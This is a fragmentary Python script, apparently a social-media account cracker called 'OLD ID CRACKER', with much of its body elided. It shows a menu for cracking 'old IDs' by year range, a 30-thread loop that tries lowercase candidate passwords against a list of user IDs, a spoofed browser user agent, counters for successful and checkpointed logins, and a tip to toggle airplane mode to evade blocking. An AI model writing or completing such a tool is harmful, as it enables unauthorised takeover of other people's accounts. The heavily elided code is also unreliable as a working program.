...
\033[0;94m [!]\033[0;91mTOOL NAME :\033[0;92mOLD ID CRACKER
\033[0;94m [!]\033[0;91mVERSION   :\033[0;92m0.107
\033[0;94m [!]\033[0;93mMR.DEVIL PROGRAMMER & DARK HACKER
\033[0;95m═══════════════════════════════════════════"""
...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print(" \033[0;93m[1]\033[0;92mCRACK OLD IDZ 2004-08\n \033[0;93m[2]\033[0;92mCRACK OLD IDZ 2008-10")
		print(" \033[0;93m[3]\033[0;92mCRACK OLD IDZ 2010-12\n \033[0;93m[4]\033[0;92mCRACK OLD IDZ 2012-15")
		print(" \033[0;93m[5]\033[0;92mCRACK PAK IDZ OLD-NEW")
		print("\033[0;95m [F]FEED BACK")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print(" \033[0;96m[+] Note: Cp Ac open after 3 Days")
				print(" [!] IF NO RESULT TURN AIRPLANE MODE ON/OF")
				print("\033[0;94m-----------------------------------------------------")
				print("\n")
				print("\033[0;97m")
				for user in self.id:
  ...
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
		...
		sys.stdout.write(
			"\r [Cracking]%s/%s -> Cp:-%s - Ok:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
